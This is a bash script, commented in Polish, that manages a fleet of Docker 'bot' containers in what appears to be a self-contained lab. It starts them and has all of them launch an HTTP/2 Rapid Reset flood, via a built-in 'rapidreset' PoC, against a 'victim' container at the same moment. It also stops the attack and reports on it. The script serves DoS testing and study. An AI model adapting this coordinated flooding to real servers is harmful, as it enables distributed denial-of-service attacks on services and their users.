#!/usr/bin/env bash
# =============================================================================
# Zarzadzanie flota botow TEGO labu (jedno polecenie = postaw / odpal / zatrzymaj
# atak na wszystkich botach naraz). Boty MAJA JUZ WGRANY PoC `rapidreset`
# wbudowany na etapie budowania obrazu (bot/Dockerfile) - ten skrypt niczego
# nie wgrywa w trakcie dzialania, tylko steruje gotowymi kontenerami.
#
# GRANICA: zarzadza wylacznie flota WLASNYCH, z gory zbudowanych kontenerow
# tego labu. Brak jakiegokolwiek mechanizmu dystrybucji/implantacji ataku na
# urzadzenia, ktore go jeszcze nie maja (to swiadomie poza zakresem).
#
# Komendy:
#   up [N]              postaw flote N botow + bazowy lab (domyslnie N=5)
#   fire [opcje]         odpal atak NA WSZYSTKICH botach floty jednoczesnie
#       --requests N      strumieni HEADERS+RST na bota (domyslnie 20000)
#       --concurrency N   rownoczesnych workerow na bota (domyslnie 200)
#       --duration S       >0: petla ataku przez S sekund (domyslnie 0 = jednorazowo)
#   stop                 zatrzymaj atak na wszystkich botach (pkill rapidreset)
#   status               tabela: ile botow atakuje + CPU/polaczenia ofiary
#   down                  zdejmij flote (zachowuje bazowy lab)
#
# Przyklady:
#   bash scenarios/botnet-fleet.sh up 5
#   bash scenarios/botnet-fleet.sh fire --requests 20000 --concurrency 300
#   bash scenarios/botnet-fleet.sh status
#   bash scenarios/botnet-fleet.sh stop
#   bash scenarios/botnet-fleet.sh down
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true
export MSYS2_ARG_CONV_EXCL='*' 2>/dev/null || true

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

FILES=(-f docker-compose.yml -f docker-compose.override.yml -f docker-compose.botnet.yml)
dc()  { docker compose "${FILES[@]}" "$@"; }

fleet_ids() { dc ps -q botfleet 2>/dev/null; }

cmd_up() {
  local n="${1:-5}"
  echo "[*] Stawiam baze + flote botfleet=$n ..."
  dc up -d --build --scale "botfleet=$n"
  echo "[*] Czekam na victim (HTTP/2) ..."
  for _ in $(seq 1 30); do
    dc exec -T loadgen curl -sk --max-time 2 https://victim/ -o /dev/null && { echo "[*] victim OK"; break; }
    sleep 1
  done
  local ids; ids="$(fleet_ids)"
  local count; count="$(echo "$ids" | grep -c . || true)"
  echo "[*] Flota gotowa: $count botow"
}

cmd_fire() {
  local req=20000 conc=200 dur=0
  while [ $# -gt 0 ]; do
    case "$1" in
      --requests)    req="$2"; shift ;;
      --concurrency) conc="$2"; shift ;;
      --duration)    dur="$2"; shift ;;
      *) echo "Nieznana opcja fire: $1" >&2; exit 2 ;;
    esac
    shift
  done

  local ids; ids="$(fleet_ids)"
  if [ -z "$ids" ]; then
    echo "[!] Flota nie istnieje. Odpal najpierw:  bash scenarios/botnet-fleet.sh up [N]" >&2
    exit 1
  fi
  local count; count="$(echo "$ids" | wc -l | tr -d ' ')"
  echo "[*] Odpalam atak na $count botach jednoczesnie (requests=$req concurrency=$conc duration=${dur}s) ..."

  for cid in $ids; do
    if [ "$dur" -gt 0 ]; then
      docker exec -d "$cid" sh -c \
        "end=\$(( \$(date +%s) + $dur )); while [ \$(date +%s) -lt \$end ]; do rapidreset -url https://victim:443 -requests $req -concurrency $conc >/dev/null 2>&1; done" &
    else
      docker exec -d "$cid" sh -c \
        "rapidreset -url https://victim:443 -requests $req -concurrency $conc >/dev/null 2>&1" &
    fi
  done
  wait
  echo "[*] Atak wystartowany na wszystkich botach floty (tlo kontenerow)."
  [ "$dur" -eq 0 ] && echo "[*] Tryb jednorazowy — sprawdz 'status' za chwile, atak sam sie zakonczy."
  [ "$dur" -gt 0 ] && echo "[*] Tryb ciagly na ${dur}s — uzyj 'stop' aby przerwac wczesniej."
}

cmd_stop() {
  local ids; ids="$(fleet_ids)"
  [ -z "$ids" ] && { echo "[!] Flota nie istnieje."; exit 1; }
  echo "[*] Zatrzymuje atak na wszystkich botach ..."
  for cid in $ids; do
    docker exec "$cid" pkill rapidreset 2>/dev/null
  done
  echo "[*] Zatrzymano."
}

cmd_status() {
  local ids; ids="$(fleet_ids)"
  if [ -z "$ids" ]; then
    echo "[!] Flota nie istnieje (odpal 'up' najpierw)."
    exit 1
  fi
  echo "--- Flota botow ---"
  printf "%-16s %-8s\n" "KONTENER" "ATAKUJE"
  local active=0 total=0
  for cid in $ids; do
    total=$((total+1))
    local name; name="$(docker inspect -f '{{.Name}}' "$cid" | sed 's#^/##')"
    if docker exec "$cid" pgrep rapidreset >/dev/null 2>&1; then
      printf "%-16s %-8s\n" "$name" "TAK"
      active=$((active+1))
    else
      printf "%-16s %-8s\n" "$name" "nie"
    fi
  done
  echo "-------------------"
  echo "Aktywnych atakow: $active / $total"
  echo
  echo "--- Ofiara (stub_status) ---"
  dc exec -T loadgen curl -sk --max-time 3 https://victim/status 2>/dev/null || echo "(brak odpowiedzi)"
}

cmd_down() {
  echo "[*] Zdejmuje flote botfleet (zachowuje bazowy lab) ..."
  dc up -d --scale botfleet=0 2>/dev/null
  echo "[*] Gotowe."
}

case "${1:-}" in
  up)     shift; cmd_up "$@" ;;
  fire)   shift; cmd_fire "$@" ;;
  stop)   cmd_stop ;;
  status) cmd_status ;;
  down)   cmd_down ;;
  *)
    sed -n '2,33p' "$0" | sed 's/^# //; s/^#//'
    exit 2
    ;;
esac
